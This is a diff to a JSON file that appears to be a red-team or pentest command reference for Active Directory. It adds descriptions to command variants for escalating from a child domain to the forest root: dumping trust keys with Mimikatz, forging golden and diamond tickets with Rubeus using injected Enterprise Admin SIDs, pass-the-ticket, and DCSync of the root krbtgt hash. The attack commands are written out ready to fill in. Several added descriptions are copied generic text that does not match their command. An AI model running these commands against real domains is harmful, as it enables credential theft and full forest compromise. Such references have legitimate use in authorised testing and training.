@@ -247,27 +247,33 @@
   "variations": [
     {
       "label": "Alt method (LO18): dump inter-realm TRUST KEY",
-      "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'   # note the [In] key for the parent domain"
+      "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'   # note the [In] key for the parent domain",
+      "description": "Runs Mimikatz operations via reflective PowerShell loading - executes entirely in memory without writing to disk."
     },
     {
       "label": "Forge referral TGT with the trust key + parent EA SID",
-      "command": "Rubeus.exe golden /rc4:<trust_key> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent_domain> /nowrap"
+      "command": "Rubeus.exe golden /rc4:<trust_key> /domain:<child_domain> /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:<parent_domain> /nowrap",
+      "description": "Forge referral TGT with the trust key + parent EA SID. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Request a parent-domain TGS with the forged ticket",
-      "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt"
+      "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "DC-identity OPSEC golden (extra SIDs -516, S-1-5-9)",
-      "command": "Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-516,S-1-5-9 /user:dcorp-dc$ /id:1000 /ptt"
+      "command": "Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-516,S-1-5-9 /user:dcorp-dc$ /id:1000 /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "Diamond ticket cross-trust (/sids)",
-      "command": "Rubeus.exe diamond /krbkey:<child_krbtgt_aes> /user:Administrator /domain:<child_domain> /sids:<parent_EA_sid> /enctype:aes /ptt"
+      "command": "Rubeus.exe diamond /krbkey:<child_krbtgt_aes> /user:Administrator /domain:<child_domain> /sids:<parent_EA_sid> /enctype:aes /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "DCSync parent forest root after escalation",
-      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\""
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\"",
+      "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
     }
   ],
   "explain": "Forges a cross-domain golden ticket that escalates from a child domain to the forest root:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>            the child domain's krbtgt hash (from DCSync)\n  /domain:<domain> /sid:<domain_sid>   the child domain and its SID\n  /sids:<parent_enterprise_admin_sid>  the parent Enterprise Admins SID (ends -519) injected into SID History\n  /user:Administrator /ptt  impersonate Administrator and inject the ticket\nSID History is not filtered inside a forest, so the ticket is honored on the parent DC - dir \\\\<parent_dc>\\C$ then DCSync the root."
